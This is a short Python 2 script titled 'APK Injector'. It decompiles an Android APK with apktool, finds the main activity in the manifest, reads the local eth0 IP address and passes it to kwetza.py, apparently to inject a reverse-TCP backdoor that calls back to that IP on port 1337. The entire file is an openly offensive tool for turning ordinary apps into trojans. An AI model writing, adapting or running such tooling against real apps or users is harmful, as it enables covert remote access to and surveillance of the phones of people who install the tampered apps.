#! python2
from bs4 import BeautifulSoup as Soup
from time import sleep
import sys
import os
import subprocess

soup    = ""
folder  = ""
appname = ""
main    = ""
IP      = ""
PORT    = ""
TYPE    = ""

def findPackage():
    #os.system('apktool --version')
    global soup
    global folder
    global appname
    curr_dir = os.getcwd()
    arg = sys.argv[1].split('/')
    appname = arg[len(arg)-1].split('.apk')[0]
    manifest_file = curr_dir + '/' + appname + '/AndroidManifest.xml'
    folder = curr_dir + '/' + appname
    file = open(manifest_file)
    page = file.read()
    soup = Soup(page, "xml")
    manifest = soup.find_all('activity')
    main_activity = manifest[0]['android:name']
    checkMain(main_activity)


def checkMain(activity):
    str_len = len(activity.split('.'))
    if str_len <= 2:
        addPackage(activity)
    else:
        global main
        main = activity
        print('Main Activity: ' + activity)
        callKwetza()

def addPackage(name):
    global soup
    global main
    manifest = soup.find_all('manifest')
    main = manifest[0]['package'] + name
    print('\r\nMain Activity: '+ main)
    print folder + '/smali/' +  changeToFolder(manifest[0]['package'] + name)
    callKwetza()

def changeToFolder(string):
    return string.replace('.', '/')

def callKwetza():
    global IP
    IP = IP.replace('\r','').replace('\n','')
    os.system('python kwetza.py ' + appname + ' tcp '+IP+' 1337 ' + main)

def getIP():
    global IP
    IP = os.popen("ifconfig eth0 | grep 'inet ' | awk -F'[: ]+' '{print $3}'").read()

def init():
    getIP()
    command = ["apktool", "d", "-f", sys.argv[1]]
    cmd = subprocess.Popen(command, stdout=subprocess.PIPE)
    while True:
        line = cmd.stdout.readline().rstrip()
        if not line:
            break
        print line

    findPackage()


if __name__ == "__main__":
    sleep(0.1)
    print("                                                            ")
    print("     _    ____  _  __  ___        _           _             ")
    print("    / \  |  _ \| |/ / |_ _|_ __  (_) ___  ___| |_ ___  _ __ ")
    print("   / _ \ | |_) | ' /   | || '_ \ | |/ _ \/ __| __/ _ \| '__|")
    print("  / ___ \|  __/| . \   | || | | || |  __/ (__| || (_) | |   ")
    print(" /_/   \_\_|   |_|\_\ |___|_| |_|/ |\___|\___|\__\___/|_|   ")
    print("                               |__/                         ")
    print("                                                            ")
    init()
